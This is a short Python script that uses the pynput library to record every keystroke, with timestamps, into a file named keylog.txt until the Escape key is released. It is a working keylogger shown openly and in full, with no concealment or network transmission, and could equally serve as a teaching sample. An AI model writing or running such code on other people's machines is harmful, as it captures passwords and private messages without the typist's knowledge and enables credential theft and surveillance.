import pynput
from pynput.keyboard import Key, Listener
import logging

# Configure the logger to log keystrokes to a file
logging.basicConfig(
    filename=("keylog.txt"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)

# Function to capture key presses and log them
def on_press(key):
    try:
        logging.info(str(key))  # Log the key pressed
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to stop logging when escape key is pressed (optional)
def on_release(key):
    if key == Key.esc:
        return False  # Stops the listener

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
